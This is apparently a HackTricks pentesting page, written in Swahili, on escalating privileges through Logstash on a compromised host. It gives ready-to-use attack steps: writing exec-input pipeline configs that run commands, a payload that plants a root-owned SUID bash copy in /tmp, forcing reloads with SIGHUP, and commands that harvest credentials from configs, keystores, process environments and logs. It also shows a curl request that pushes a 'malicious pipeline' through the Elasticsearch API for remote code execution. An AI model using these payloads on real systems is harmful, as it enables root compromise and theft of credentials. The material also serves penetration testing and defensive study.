# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash hutumika **kukusanya, kubadilisha, na kusambaza logs** kupitia mfumo unaojulikana kama **pipelines**. Pipelines hizi zinaundwa na hatua za **input**, **filter**, na **output**.<sup>[[4]](#references)</sup> Kipengele cha kuvutia hujitokeza Logstash inapofanya kazi kwenye mashine iliyoathirika.

### Usanidi wa Pipeline

Kwenye usakinishaji wa vifurushi vya Debian na RPM, pipelines husanidiwa kupitia **/etc/logstash/pipelines.yml**, ambayo huorodhesha maeneo ya usanidi wa pipelines; distributions nyingine huweka `pipelines.yml` kwenye directory ya Logstash `path.settings`.<sup>[[5]](#references)[[6]](#references)</sup>
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Faili hii inaonyesha mahali zilipo faili za **.conf** zenye pipeline configurations. Unapotumia **Elasticsearch output**, kagua mipangilio yake ya `user`/`password`, `cloud_auth`, au `api_key`; privileges zinazotumika za akaunti hutegemea Elasticsearch. Glob ya `path.config` hupakia kila faili linalolingana kwa ajili ya pipeline hiyo.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Ikiwa Logstash imeanzishwa kwa `-f <directory>` badala ya `pipelines.yml`, `-f` hupewa kipaumbele na **faili zote zilizo ndani ya directory hiyo huunganishwa kwa mpangilio wa lexicographical na kuchanganuliwa kama config moja**.<sup>[[6]](#references)[[7]](#references)</sup> Hii huleta athari 2 za ki-offensive:

- Faili lililowekwa kama `000-input.conf` au `zzz-output.conf` linaweza kubadilisha jinsi pipeline ya mwisho inavyoundwa
- Faili lililo na makosa linaweza kusababisha config iliyounganishwa ishindwe validation; wakati wa reload, Logstash huhifadhi pipeline ya awali, kwa hivyo validate payloads kabla ya kutegemea auto-reload.<sup>[[1]](#references)</sup>

### Enumeration ya Haraka kwenye Host Iliyoathirika

Kwenye box ambayo Logstash imewekwa, kagua kwa haraka:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Pia angalia ikiwa API ya ufuatiliaji ya ndani inafikika. Kwa chaguo-msingi, hufungamana na **127.0.0.1:9600**, ambacho kwa kawaida hutosha baada ya kupata ufikiaji wa host.<sup>[[8]](#references)</sup>
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Endpoints hizi hufichua pipeline IDs na settings, runtime metrics, pamoja na counters za config-reload iliyofaulu/kushindwa, na kusaidia kuthibitisha ikiwa mabadiliko yamekubaliwa.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Ikiwa credential iliyopatikana inalenga **Elasticsearch**, angalia [ukurasa huu mwingine kuhusu Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Ili kujaribu privilege escalation, kwanza tambua mtumiaji ambaye Logstash service inaendeshwa chini yake; usidhani kuwa ni root au mtumiaji wa **logstash**. Hakikisha unatimiza **moja** ya vigezo hivi:

- Una **write access** kwenye file ya pipeline **.conf** **au**
- File ya **/etc/logstash/pipelines.yml** inatumia wildcard, na unaweza kuandika kwenye folder lengwa.<sup>[[6]](#references)[[7]](#references)</sup>

Zaidi ya hayo, **moja** ya masharti haya lazima itimizwe:

- Uwezo wa kurestart Logstash service **au**
- File ya **/etc/logstash/logstash.yml** ina **config.reload.automatic: true** iliyowekwa.<sup>[[1]](#references)[[15]](#references)</sup>

Ikiwa kuna wildcard katika configuration, kuunda file linalolingana na wildcard hiyo huwezesha command execution.<sup>[[7]](#references)[[9]](#references)</sup> Kwa mfano:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Hapa, **interval** huamua mara kwa mara utekelezaji katika sekunde. Katika mfano uliotolewa, amri ya **whoami** huendeshwa kila baada ya sekunde 120, huku matokeo yake yakielekezwa kwenye **/tmp/output.log**.<sup>[[9]](#references)</sup>

Kwa **config.reload.automatic: true** katika **/etc/logstash/logstash.yml**, Logstash itagundua na kutumia kiotomatiki mipangilio mipya au iliyorekebishwa ya pipeline bila kuhitaji kuanzishwa upya.<sup>[[1]](#references)[[15]](#references)</sup> Ikiwa hakuna wildcard, marekebisho bado yanaweza kufanywa kwenye mipangilio iliyopo, lakini tahadhari inashauriwa ili kuepuka usumbufu.

### Payloads za Pipeline Zinazoaminika Zaidi

Plugin ya input ya `exec` bado inafanya kazi katika matoleo ya sasa na inahitaji ama `interval` au `schedule`. Hutekeleza kwa **forking** JVM ya Logstash, kwa hivyo ikiwa memory ni ndogo payload yako inaweza kushindwa kwa `ENOMEM` badala ya kuendelea kufanya kazi bila kutoa taarifa.<sup>[[9]](#references)</sup>

Wakati service ina privileges za kutosha kuunda faili ya SUID inayomilikiwa na root, payload ya practical privilege-escalation ni ile inayoacha artifact inayodumu:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Ikiwa huna haki za kuanzisha upya lakini unaweza kutuma signal kwa process, Logstash pia inasaidia reload inayochochewa na **SIGHUP** kwenye mifumo inayofanana na Unix:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Kumbuka kwamba si kila plugin inaweza kufanya reload. Kwa mfano, input ya **stdin** huzuia reload ya kiotomatiki, kwa hiyo usidhani kwamba `config.reload.automatic` itatambua mabadiliko yako kila wakati.<sup>[[1]](#references)</sup>

### Kuiba Secrets kutoka Logstash

Kabla ya kulenga code execution pekee, kusanya data ambayo Logstash tayari inaweza kufikia:

- Credentials zinaweza kuonekana katika outputs za `elasticsearch {}`, URLs/settings za `http_poller`, inputs za JDBC, au settings zinazohusiana na cloud; plugins hizi hufichua sehemu za credentials zinazofaa kutafutwa.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Secure settings zinaweza kuwa katika **`/etc/logstash/logstash.keystore`** au directory nyingine ya `path.settings`.<sup>[[5]](#references)[[10]](#references)</sup>
- Password ya keystore inaweza kutolewa kupitia **`LOGSTASH_KEYSTORE_PASS`**, na installs za RPM/DEB hupakia service environment variables kutoka **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- Upanuzi wa environment variable kwa kutumia `${VAR}` hutatuliwa Logstash inapoanza, kwa hiyo service environment inafaa kukaguliwa.<sup>[[14]](#references)</sup>

Ukaguzi muhimu:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Hii pia inafaa kuchunguzwa kwa sababu **CVE-2023-46672** ilionyesha kuwa, chini ya hali maalum, Logstash iliweka taarifa nyeti kwenye logs zake, ikiwemo secrets zilizohifadhiwa kwenye keystore yake na kurejelewa kutoka kwenye configuration; kagua logs za zamani za Logstash na maingizo ya `journald` ikiwa hali hizo zinaweza kutumika.<sup>[[3]](#references)</sup>

### Matumizi Mabaya ya Centralized Pipeline Management

Katika baadhi ya mazingira, host **haitumii** kabisa faili za local `.conf`. Ikiwa **`xpack.management.enabled: true`** imesanidiwa, Logstash inaweza kuvuta pipelines zinazosimamiwa centrally kutoka Elasticsearch/Kibana, na baada ya kuwezesha hali hii, local pipeline configs si chanzo tena cha ukweli.<sup>[[2]](#references)</sup>

Hii inamaanisha kuna njia tofauti ya attack:

1. Pata Elastic credentials kutoka kwenye mipangilio ya local ya Logstash, keystore, au logs.<sup>[[3]](#references)[[10]](#references)</sup>
2. Thibitisha ikiwa account ina cluster privilege ya **`manage_logstash_pipelines`**.<sup>[[16]](#references)</sup>
3. Unda au badilisha pipeline inayosimamiwa centrally ili host ya Logstash itekeleze payload yako kwenye poll interval inayofuata.<sup>[[2]](#references)[[16]](#references)</sup>

API ya Elasticsearch inayotumiwa kwa feature hii ni:<sup>[[16]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"last_modified": "2026-01-02T02:50:51.250Z",
"username": "user",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {
"pipeline.workers": 1,
"pipeline.batch.size": 1,
"pipeline.batch.delay": 50,
"queue.type": "memory",
"queue.max_bytes": "1gb",
"queue.checkpoint.writes": 1024
}
}'
```
Hii ni muhimu hasa wakati faili za ndani ni za kusomeka tu lakini Logstash tayari imesajiliwa ili kuchukua pipelines kwa mbali.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Kupakia upya Faili ya Usanidi](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Kusanidi Usimamizi wa Kati wa Pipeline](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Sasisho la Usalama la Logstash 8.11.1 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Kuunda Pipeline ya Logstash](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Mpangilio wa Saraka za Logstash](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Pipelines Nyingi](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Kuendesha Logstash kutoka kwenye Command Line](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: Kufuatilia Logstash kwa kutumia APIs](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Plugin ya Ingizo ya Exec](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Keystore ya Siri kwa Mipangilio Salama](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Plugin ya Tokeo ya Elasticsearch](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Plugin ya Ingizo ya Http_poller](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Plugin ya Ingizo ya Jdbc](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Kutumia Vigezo vya Mazingira](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Kuunda au kusasisha Pipeline ya Logstash](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Kupata Mipangilio ya Pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Kupata Takwimu za Pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
